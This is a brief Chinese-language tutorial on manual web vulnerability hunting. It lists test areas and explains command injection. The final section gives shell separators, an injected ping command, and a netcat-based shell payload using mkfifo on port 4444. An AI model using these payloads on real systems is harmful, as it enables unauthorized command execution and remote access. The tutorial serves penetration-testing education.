# 手动漏洞挖掘简介

> 主要是验证漏洞扫描器扫描出来的漏洞，以及手动挖掘一些漏洞扫描器扫描不到的漏洞，比如逻辑漏洞、需要绕过WAF的操作。这个阶段可能需要类似 BurpSuite 的工具辅助进行。

## 0x01 为什么需要手动挖掘

- 扫描器存在误报和漏报
- 逻辑漏洞无法被自动化工具发现
- 复杂的认证和授权问题需要人工分析
- WAF/IDS 可能拦截扫描器的测试请求

## 0x02 手动挖掘的主要方向

| 方向 | 说明 |
|------|------|
| 默认配置检查 | 默认安装的安全隐患 |
| 身份认证 | 弱口令、账号锁定、密码策略 |
| 会话管理 | Session ID 随机性、过期策略 |
| 命令执行 | 操作系统命令注入 |
| 文件操作 | 文件上传、文件包含、目录遍历 |
| SQL注入 | 各类SQL注入变体 |
| XSS | 反射型、存储型、DOM型 |
| CSRF | 跨站请求伪造 |

## 0x03 漏洞挖掘原则

- 测试 **所有变量** 和 **所有头**（包括 Cookie 中的变量）
- **逐个变量删除**，观察应用行为变化
- 漏洞的本质: **数据与指令的混淆** -- 对用户输入过滤不严，误将指令当数据

## 0x04 命令执行漏洞

应用程序开发者直接调用操作系统功能时，可通过以下分隔符注入命令:

```
;  &&  |  ||  &
```

示例:

```bash
# 正常输入
ping -c 1 192.168.1.1

# 注入命令
ping -c 1 192.168.1.1; ls; pwd

# 反弹Shell
;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 > /tmp/pipe
```

关键: **查看源码，分析过滤逻辑**，寻找绕过方式。
